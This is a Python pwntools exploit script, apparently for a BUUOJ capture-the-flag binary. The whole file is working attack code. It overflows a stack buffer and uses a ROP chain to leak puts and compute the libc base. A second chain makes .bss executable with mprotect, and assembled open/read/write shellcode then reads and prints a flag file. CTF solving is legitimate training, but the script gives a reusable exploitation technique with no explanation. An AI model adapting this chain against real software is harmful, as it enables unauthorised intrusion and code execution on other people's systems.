import sys
from pwn import*
context.log_level='debug'
context.arch='amd64'
while True:
	if len(sys.argv)==1:
		io=process('./pwn')
		elf=ELF('./pwn')
		libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
	else:
		io=remote('node3.buuoj.cn',28743)
		elf=ELF('./pwn')
		libc=ELF('./libc-2.27.so')

	main_addr=0x4019f3
	puts_got=elf.got['puts']
	puts_plt=elf.plt['puts']
	pop_rdi=0x0000000000401b93
	pop_rsi=0x0000000000401b91
	pay='a'*0x418+p8(0x28)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
	io.sendlineafter('>> ',pay)
	io.recv(0x2e)
	libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['puts']
	success('libc_base:'+hex(libc_base))
	pop_rdx=libc_base+0x0000000000001b96
	bss_addr=elf.bss()
	pay='a'*0x418+p8(0x28)+p64(pop_rdi)+p64(bss_addr)+p64(libc_base+libc.sym['gets'])+p64(pop_rdi)+p64(bss_addr&0xfffffffffffff000)+p64(pop_rsi)+p64(0x1000)+p64(0)+p64(pop_rdx)+p64(7)+p64(libc_base+libc.sym['mprotect'])+p64(bss_addr)
	#gdb.attach(io)
	#pause()
	io.sendlineafter('>> ',pay)
	shell='''
		mov rax, 0x67616c662f2e
push rax
mov rdi, rsp
xor esi, esi
mov eax, 2
syscall

cmp eax, 0
jg next
push 1
mov edi, 1
mov rsi, rsp
mov edx, 4
mov eax, edi
syscall
jmp exit

next:
mov edi, eax
mov rsi, rsp
mov edx, 0x100
xor eax, eax
syscall

mov edx, eax
mov edi, 1
mov rsi, rsp
mov eax, edi
syscall

exit:
xor edi, edi
mov eax, 231
syscall
	'''

	io.sendlineafter('path.\n',asm(shell))#\x0f\x05
	io.recv()

	#gdb.attach(io)
	#pause()
	io.interactive()